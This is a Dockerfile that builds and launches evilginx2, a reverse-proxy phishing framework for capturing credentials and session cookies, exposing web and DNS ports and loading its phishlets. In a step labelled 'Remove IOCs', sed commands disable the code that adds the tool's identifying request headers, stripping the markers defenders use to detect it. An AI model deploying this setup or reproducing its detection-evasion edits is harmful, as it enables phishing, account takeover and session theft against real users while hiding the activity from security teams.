FROM alpine:latest

LABEL maintainer="froyo75@users.noreply.github.com"

ENV GOLANG_VERSION=1.16
ENV GOPATH=/opt/go
ENV GITHUB_USER="kgretzky"
ENV EVILGINX_REPOSITORY="github.com/${GITHUB_USER}/evilginx2"
ENV INSTALL_PACKAGES="go git gcc musl-dev make openssl-dev ca-certificates"
ENV PROJECT_DIR="${GOPATH}/src/${EVILGINX_REPOSITORY}"
ENV EVILGINX_BIN="/bin/evilginx"
ENV EVILGINX_PORTS="443 80 53/udp"

RUN apk update && apk add --no-cache bash ${INSTALL_PACKAGES} && update-ca-certificates

# Install & Configure Go
RUN wget https://dl.google.com/go/go${GOLANG_VERSION}.src.tar.gz && tar -C /usr/local -xzf go$GOLANG_VERSION.src.tar.gz
RUN cd /usr/local/go/src && ./make.bash
RUN PATH="/usr/local/go/bin:$PATH"
RUN PATH=$PATH:${GOPATH}/bin 
RUN rm go${GOLANG_VERSION}.src.tar.gz

# Install & Run EvilGinx2
RUN set -ex \
    && mkdir -p ${GOPATH}/src/github.com/${GITHUB_USER} \
    && git -C ${GOPATH}/src/github.com/${GITHUB_USER} clone https://github.com/${GITHUB_USER}/evilginx2 \
    # Remove IOCs
    && sed -i -e 's/egg2 := req.Host/\/\/egg2 := req.Host/g' -e 's/e_host := req.Host/\/\/e_host := req.Host/g' -e 's/req.Header.Set(string(hg), egg2)/\/\/req.Header.Set(string(hg), egg2)/g' -e 's/req.Header.Set(string(e), e_host)/\/\/req.Header.Set(string(e), e_host)/g' -e 's/p.cantFindMe(req, e_host)/\/\/p.cantFindMe(req, e_host)/g' ${PROJECT_DIR}/core/http_proxy.go \
    && cd ${PROJECT_DIR}/ && go get ./... && make \
    && cp -v ${PROJECT_DIR}/bin/evilginx ${EVILGINX_BIN} \
    && mkdir /app && cp -vr ${PROJECT_DIR}/phishlets /app \
    && apk del ${INSTALL_PACKAGES} && rm -rf /var/cache/apk/* && rm -rf ${GOPATH}/src/*

EXPOSE ${EVILGINX_PORTS}

CMD ["/bin/evilginx", "-p", "/app/phishlets"]
